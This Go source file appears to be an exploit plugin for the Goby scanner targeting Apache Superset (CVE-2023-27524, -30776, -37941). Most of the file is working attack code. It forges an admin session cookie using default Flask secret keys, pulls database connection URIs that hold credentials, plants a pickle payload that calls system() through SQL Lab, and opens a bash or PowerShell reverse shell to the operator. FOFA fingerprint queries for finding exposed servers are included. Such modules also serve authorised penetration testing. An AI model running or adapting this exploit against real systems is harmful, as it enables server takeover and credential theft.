package exploits

import (
	"bytes"
	"compress/zlib"
	"crypto/hmac"
	"crypto/sha1"
	"crypto/subtle"
	"encoding/base64"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"io"
	"net/url"
	"regexp"
	"strconv"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "Apache Superset Cookie Permission Bypass Vulnerability (CVE-2023-30776)",
    "Description": "<p>Apache Superset is an open source modern data exploration and visualization platform.</p><p>Apache Superset Cookie has a permission bypass vulnerability that allows an attacker to control the entire system, ultimately leaving the system in an extremely unsafe state.</p>",
    "Product": "APACHE-Superset",
    "Homepage": "https://superset.apache.org/",
    "DisclosureDate": "2023-09-15",
    "PostTime": "2023-10-09",
    "Author": "1438340838@qq.com",
    "FofaQuery": "(title=\"Superset\" && (body=\"appbuilder\" || body=\"<img src=\\\"https://joinsuperset.com/img/supersetlogovector.svg\")) || body=\"<a href=\\\"https://manage.app-sdx.preset.io\\\" class=\\\"button\\\">Back to workspaces</a></section>\" || (body=\"/static/assets/dist/common.644ae7ae973b00abc14b.entry.js\" || (body=\"/static/assets/images/favicon.png\" && body=\"/static/appbuilder/js/jquery-latest.js\") && body=\"Superset\") || header=\"/superset/welcome/\" || title=\"500: Internal server error | Superset\" || title=\"404: Not found | Superset\" || banner=\"/superset/welcome/\" || banner=\"/superset/dashboard/\"",
    "GobyQuery": "(title=\"Superset\" && (body=\"appbuilder\" || body=\"<img src=\\\"https://joinsuperset.com/img/supersetlogovector.svg\")) || body=\"<a href=\\\"https://manage.app-sdx.preset.io\\\" class=\\\"button\\\">Back to workspaces</a></section>\" || (body=\"/static/assets/dist/common.644ae7ae973b00abc14b.entry.js\" || (body=\"/static/assets/images/favicon.png\" && body=\"/static/appbuilder/js/jquery-latest.js\") && body=\"Superset\") || header=\"/superset/welcome/\" || title=\"500: Internal server error | Superset\" || title=\"404: Not found | Superset\" || banner=\"/superset/welcome/\" || banner=\"/superset/dashboard/\"",
    "Level": "3",
    "Impact": "<p>Apache Superset Cookie has a permission bypass vulnerability that allows an attacker to control the entire system, ultimately leaving the system in an extremely unsafe state.</p>",
    "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:</p><p><a href=\"https://github.com/sylabs/sif\"></a><a href=\"http://www.example.com\">https://superset.apache.org/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "login,databases,reverse",
            "show": ""
        },
        {
            "name": "os",
            "type": "select",
            "value": "linux,windows",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": []
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution",
        "Information Disclosure",
        "Permission Bypass"
    ],
    "VulType": [
        "Command Execution",
        "Information Disclosure",
        "Permission Bypass"
    ],
    "CVEIDs": [
        "CVE-2023-27524",
        "CVE-2023-30776",
        "CVE-2023-37941"
    ],
    "CNNVD": [
        "CNNVD-202304-1913",
        "CNNVD-202309-533",
        "CNNVD-202304-1915"
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "Apache Superset Cookie 权限绕过漏洞（CVE-2023-27524）",
            "Product": "APACHE-Superset",
            "Description": "<p>Apache Superset 是一个开源的现代数据探索和可视化平台。</p><p>Apache Superset Cookie 存在权限绕过漏洞，攻击者可通过该漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>1、官方已经修复该漏洞，请用户联系厂商修复漏洞：<a href=\"http://www.example.com\" target=\"_blank\">https://superset.apache.org/</a><br></p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>3、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>Apache Superset Cookie 存在权限绕过漏洞，攻击者可通过该漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "命令执行",
                "信息泄露",
                "权限绕过"
            ],
            "Tags": [
                "命令执行",
                "信息泄露",
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Apache Superset Cookie Permission Bypass Vulnerability (CVE-2023-30776)",
            "Product": "APACHE-Superset",
            "Description": "<p>Apache Superset is an open source modern data exploration and visualization platform.</p><p>Apache Superset Cookie has a permission bypass vulnerability that allows an attacker to control the entire system, ultimately leaving the system in an extremely unsafe state.</p>",
            "Recommendation": "<p>1. The official has fixed the vulnerability, please pay attention to the manufacturer's homepage update:<br></p><p><a href=\"https://github.com/sylabs/sif\"></a><a href=\"http://www.example.com\" target=\"_blank\">https://superset.apache.org/</a></p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p><p>3. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Apache Superset Cookie has a permission bypass vulnerability that allows an attacker to control the entire system, ultimately leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "Command Execution",
                "Information Disclosure",
                "Permission Bypass"
            ],
            "Tags": [
                "Command Execution",
                "Information Disclosure",
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10842"
}`

	getAllDashboardId253445hgjhg := func(hostInfo *httpclient.FixUrl, forgedCookie string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig("/api/v1/dashboard/")
		sendConfig.Header.Store("Cookie", "session="+forgedCookie)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	getPermanentLink32155hgj := func(hostInfo *httpclient.FixUrl, forgedCookie string, dashboardId float64) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/api/v1/dashboard/" + strconv.FormatFloat(dashboardId, 'f', -1, 64) + "/permalink")
		sendConfig.Header.Store("Content-Type", "application/json")
		sendConfig.Header.Store("Cookie", "session="+forgedCookie)
		sendConfig.Header.Store("Sec-Fetch-Dest", "empty")
		sendConfig.Header.Store("Sec-Fetch-Mode", "same-origin")
		sendConfig.Header.Store("Sec-Fetch-Site", "same-origin")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Data = "{\"filterState\":{},\"urlParams\":[]}"
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	accessPermanentLink662fgha := func(hostInfo *httpclient.FixUrl, forgedCookie string, permanentLinkKey string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewGetRequestConfig(hostInfo.FixedHostInfo + "/superset/dashboard/p/" + permanentLinkKey + "/")
		sendConfig.Header.Store("Cookie", "session="+forgedCookie)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	sendExecSqlPayload5315hjksw := func(hostInfo *httpclient.FixUrl, forgedCookie, databaseId, sql string) (*httpclient.HttpResponse, error) {
		sendConfig := httpclient.NewPostRequestConfig("/superset/sql_json/")
		sendConfig.Header.Store("Content-Type", "application/json")
		sendConfig.Header.Store("Cookie", "session="+forgedCookie)
		sendConfig.Header.Store("Sec-Fetch-Dest", "empty")
		sendConfig.Header.Store("Sec-Fetch-Mode", "same-origin")
		sendConfig.Header.Store("Sec-Fetch-Site", "same-origin")
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		sendConfig.Data = "{\"client_id\":\"" + goutils.RandomHexString(9) + "\",\"database_id\":" + databaseId + ",\"json\":true,\"runAsync\":false,\"schema\":\"main\",\"sql\":\"" + sql + "\",\"sql_editor_id\":\"1\",\"tab\":\"Untitled Query 1\",\"tmp_table_name\":\"\",\"select_as_cta\":false,\"ctas_method\":\"TABLE\",\"queryLimit\":1000,\"expand_data\":true}"
		return httpclient.DoHttpRequest(hostInfo, sendConfig)
	}

	// 解密提取 Header 部分
	decodeSessionFlagGdxNfqtLH := func(session string) (string, error) {
		var compressed bool
		if session[0] == '.' {
			session = session[1:]
			compressed = true
		}
		encodedSig := strings.ReplaceAll(strings.Split(session, ".")[0], "-", "+")
		encodedSig = strings.ReplaceAll(encodedSig, "-", "+")
		encodedSig = strings.ReplaceAll(encodedSig, "_", "/")
		padding := len(encodedSig) % 4
		if padding > 0 {
			encodedSig += strings.Repeat("=", 4-padding)
		}
		decodedBytes, _ := base64.StdEncoding.DecodeString(encodedSig)
		if compressed {
			decompressData, err := zlib.NewReader(bytes.NewReader(decodedBytes))
			if err != nil {
				return "", err
			}
			defer func(decompressData io.ReadCloser) {
				err = decompressData.Close()
				if err != nil {
				}
			}(decompressData)
			buf := new(bytes.Buffer)
			_, err = buf.ReadFrom(decompressData)
			if err != nil {
				return "", err
			}
			return string(buf.Bytes()), nil
		} else {
			return string(decodedBytes), nil
		}
	}

	allDatabaseIdFlagGdxNfqtLH := func(hostInfo *httpclient.FixUrl, session string) ([]interface{}, error) {
		sendConfig := httpclient.NewGetRequestConfig("/api/v1/database/")
		sendConfig.Header.Store("Cookie", "session="+session)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		var data map[string]interface{}
		if err != nil {
			return nil, err
		} else if resp.StatusCode != 200 {
			return nil, errors.New("漏洞利用失败")
		}
		err = json.Unmarshal([]byte(resp.RawBody), &data)
		if err != nil {
			return nil, err
		}
		// 循环 ID 读取数据数据库配置信息
		ids, ok := data["ids"].([]interface{})
		if !ok {
			return nil, errors.New("漏洞利用失败")
		}
		return ids, nil
	}

	getDatabaseFlagGdxNfqtLH := func(hostInfo *httpclient.FixUrl, session, id string) (string, error) {
		var data map[string]interface{}
		sendConfig := httpclient.NewGetRequestConfig("/api/v1/database/" + id)
		sendConfig.Header.Store("Cookie", "session="+session)
		sendConfig.VerifyTls = false
		sendConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, sendConfig)
		if err != nil {
			return "", err
		} else if resp.StatusCode != 200 || json.Unmarshal([]byte(resp.RawBody), &data) != nil {
			return "", nil
		}
		// 提取数据结果
		if result, ok := data["result"].(map[string]interface{}); !ok {
			return "", nil
		} else {
			if sqlalchemy, ok := result["sqlalchemy_uri"].(string); !ok {
				return "", nil
			} else {
				return sqlalchemy, nil
			}
		}
	}

	allDatabaseFlagGdxNfqtLH := func(hostInfo *httpclient.FixUrl, session string) (string, error) {
		ids, err := allDatabaseIdFlagGdxNfqtLH(hostInfo, session)
		if err != nil {
			return "", err
		} else if ids == nil {
			return "", errors.New("漏洞利用失败")
		}
		var databases []string
		for _, id := range ids {
			sqlalchemy, err := getDatabaseFlagGdxNfqtLH(hostInfo, session, strconv.FormatFloat(id.(float64), 'f', -1, 64))
			if err != nil {
				return "", err
			} else if err == nil && sqlalchemy == "" {
				break
			}
			databases = append(databases, sqlalchemy)
		}
		if len(databases) == 0 {
			return "", errors.New("漏洞利用失败")
		}
		return strings.Join(databases, "\n"), nil
	}

	verifySessionFlagGdxNfqtLH := func(session string, keyList []string) ([]byte, error) {
		// 解密获取 Header
		sessionHeader, err := decodeSessionFlagGdxNfqtLH(session)
		if err != nil {
			return nil, err
		}
		// 提取 sig
		if len(strings.SplitN(session, ".", 3)) < 2 {
			return nil, errors.New("漏洞利用失败")
		}
		sig := strings.SplitN(session, ".", 3)[2]
		// header + payload base64 编码
		value := strings.TrimRight(base64.StdEncoding.EncodeToString([]byte(sessionHeader)), "=")
		for _, secretKey := range keyList {
			// 然后获取当前时间戳:
			value = value + "." + strings.SplitN(session, ".", 3)[1]
			// base64_decode(sig)
			// sig 是 以.号分割的最后一串字符串
			encodedSig := strings.ReplaceAll(sig, "-", "+")
			encodedSig = strings.ReplaceAll(encodedSig, "-", "+")
			encodedSig = strings.ReplaceAll(encodedSig, "_", "/")
			padding := len(encodedSig) % 4
			if padding > 0 {
				encodedSig += strings.Repeat("=", 4-padding)
			}
			decodedSig, err := base64.StdEncoding.DecodeString(encodedSig)
			if err != nil {
				continue
			}
			// derive_key 函数
			secretKeySign := hmac.New(sha1.New, []byte(secretKey))
			secretKeySign.Write([]byte("cookie-session"))
			secretKeySignOut := secretKeySign.Sum(nil)
			// get_signature 函数
			getSignature := hmac.New(sha1.New, secretKeySignOut)
			getSignature.Write([]byte(value))
			getSignatureOut := getSignature.Sum(nil)
			// 进行hash比较,比较的结果为完全相同才是正确选项
			if subtle.ConstantTimeCompare(decodedSig, getSignatureOut) == 1 {
				return secretKeySignOut, nil
			}
		}
		return nil, errors.New("漏洞利用失败")
	}

	generateSessionFlagGdxNfqtLH := func(hostInfo *httpclient.FixUrl) (string, error) {
		// 读取目标的 session
		getSessionRequestConfig := httpclient.NewGetRequestConfig("/login/")
		getSessionRequestConfig.VerifyTls = false
		getSessionRequestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, getSessionRequestConfig)
		session := ""
		if err != nil {
			return "", err
		} else if len(regexp.MustCompile(`session=([^;]+)`).FindStringSubmatch(resp.Cookie)) == 2 {
			session = regexp.MustCompile(`session=([^;]+)`).FindStringSubmatch(resp.Cookie)[1]
		} else {
			return "", errors.New("漏洞利用失败")
		}
		// session 解密，确认是否为默认密钥
		secretKeySignByte, err := verifySessionFlagGdxNfqtLH(session, []string{"thisISaSECRET_1234", "CHANGE_ME_TO_A_COMPLEX_RANDOM_SECRET", "\x02\x01thisismyscretkey\x01\x02\\e\\y\\y\\h", "YOUR_OWN_RANDOM_GENERATED_SECRET_KEY", "TEST_NON_DEV_SECRET"})
		if err != nil {
			return "", err
		}
		// 伪造一个 payload 数据用户 id 1
		payload := `{"_user_id":1,"user_id":1}`
		// 先对第一次回显包的json数据base64编码
		value := strings.TrimRight(base64.StdEncoding.EncodeToString([]byte(payload)), "=")
		// 然后生成当前时间戳:
		timestamp := int(time.Now().Unix())
		tmpByte := make([]byte, 4)
		binary.BigEndian.PutUint32(tmpByte, uint32(timestamp))
		timestampBytes := tmpByte
		base64Encoded := base64.StdEncoding.EncodeToString(timestampBytes)
		currentTimestamp := strings.TrimRight(base64Encoded, base64Encoded[len(base64Encoded)-2:])
		value = value + "." + currentTimestamp
		hash := hmac.New(sha1.New, secretKeySignByte)
		hash.Write([]byte(value))
		hashSig := hash.Sum(nil)
		// return value + base64_decode(sig)
		return fmt.Sprintf("%s.%s", value, strings.TrimRight(base64.URLEncoding.EncodeToString(hashSig), "=")), nil
	}

	// CVE-2023-37941
	execCmdFlagGdxNfqtLH := func(hostInfo *httpclient.FixUrl, session, cmd, os string) (*httpclient.HttpResponse, error) {
		ids, err := allDatabaseIdFlagGdxNfqtLH(hostInfo, session)
		if err != nil {
			return nil, err
		} else if ids == nil {
			return nil, errors.New("漏洞利用失败")
		}
		canRceDatabaseId := -1.0
		for _, id := range ids {
			sqlalchemy, err := getDatabaseFlagGdxNfqtLH(hostInfo, session, strconv.FormatFloat(id.(float64), 'f', -1, 64))
			if err != nil {
				return nil, err
			} else if err == nil && sqlalchemy == "" {
				break
			}
			if !strings.HasPrefix(sqlalchemy, `sqlite://`) {
				continue
			}
			resp, err := sendExecSqlPayload5315hjksw(hostInfo, session, strconv.FormatFloat(id.(float64), 'f', -1, 64), `DELETE FROM key_value;`)
			if err != nil {
				return nil, err
			} else if resp.StatusCode == 200 && strings.Contains(resp.RawBody, "\"status\": \"success\"") {
				canRceDatabaseId = id.(float64)
				break
			}
		}
		if canRceDatabaseId == -1.0 {
			return nil, errors.New("漏洞利用失败")
		}
		// 获取所有的 DashboardId
		resp, err := getAllDashboardId253445hgjhg(hostInfo, session)
		if err != nil {
			return nil, errors.New("漏洞利用失败")
		}
		var data map[string]interface{}
		err = json.NewDecoder(strings.NewReader(resp.RawBody)).Decode(&data)
		if err != nil {
			return nil, errors.New("漏洞利用失败")
		}
		dashboardIds, ok := data["ids"].([]interface{})
		if !ok {
			return nil, errors.New("漏洞利用失败")
		}
		// 遍历 DashboardId 用于获取 永久链接,只要有一个符合的就退出,并使用这个 永久链接
		permanentLinkKey := ""
		for _, id := range dashboardIds {
			resp, err = getPermanentLink32155hgj(hostInfo, session, id.(float64))
			if err != nil {
				return nil, err
			} else if resp.StatusCode == 201 {
				err = json.Unmarshal([]byte(resp.RawBody), &data)
				if err != nil {
					return nil, err
				}
				permanentLinkKey, _ = data["key"].(string)
				break
			}
		}
		if permanentLinkKey == "" {
			return nil, errors.New("漏洞利用失败")
		}
		prefix := "cnt"
		if os == "linux" {
			prefix = "cposix"
		}
		payload := []byte(prefix + "\nsystem\np0\n(V" + cmd + "\np1\ntp2\nRp3\n.")
		resp, err = sendExecSqlPayload5315hjksw(hostInfo, session, strconv.FormatFloat(canRceDatabaseId, 'f', -1, 64), `UPDATE key_value SET value = X'`+hex.EncodeToString(payload)+"'")
		if err != nil {
			return nil, err
		} else if resp.StatusCode != 200 || !strings.Contains(resp.RawBody, "\"status\": \"success\"") {
			return nil, errors.New("漏洞利用失败")
		}
		resp, err = accessPermanentLink662fgha(hostInfo, session, permanentLinkKey)
		if err != nil {
			return nil, err
		} else if resp.StatusCode != 308 && (resp.StatusCode != 500 || !strings.Contains(resp.RawBody, "object of type 'int' has no len()")) {
			return nil, errors.New("漏洞利用失败")
		}
		return resp, err
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			session, err := generateSessionFlagGdxNfqtLH(hostInfo)
			if err != nil || session == "" {
				return false
			}
			ids, _ := allDatabaseIdFlagGdxNfqtLH(hostInfo, session)
			return ids != nil
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType != "login" && attackType != "databases" && attackType != "reverse" {
				expResult.Output = "未知的利用类型"
				return expResult
			}
			session, err := generateSessionFlagGdxNfqtLH(expResult.HostInfo)
			if err != nil {
				expResult.Output = err.Error()
				return expResult
			} else if session == "" {
				expResult.Output = `漏洞利用失败`
				return expResult
			}
			if attackType == "login" {
				expResult.Success = true
				expResult.Output = `Cookie: session=` + session
			} else if attackType == "databases" {
				// CVE-2023-30776
				databases, err := allDatabaseFlagGdxNfqtLH(expResult.HostInfo, session)
				if err != nil {
					expResult.Output = err.Error()
				} else if databases == "" {
					expResult.Output = `漏洞利用失败`
				} else {
					expResult.Success = true
					expResult.Output = databases
				}
			} else if attackType == "reverse" {
				// CVE-2023-37941
				os := goutils.B2S(ss.Params["os"])
				waitSessionCh := make(chan string)
				port, err := godclient.WaitSession("reverse_"+os, waitSessionCh)
				if err != nil {
					expResult.Output = err.Error()
					return expResult
				}
				cmd := "bash -c '" + godclient.ReverseTCPByBash(port) + "'"
				if os == "windows" {
					cmd = godclient.ReverseTCPByPowershell(port)
				}
				execCmdFlagGdxNfqtLH(expResult.HostInfo, session, cmd, os)
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
						return expResult
					}
				case <-time.After(time.Second * 15):
					expResult.Output = "漏洞利用失败"
				}
			}
			return expResult
		},
	))
}
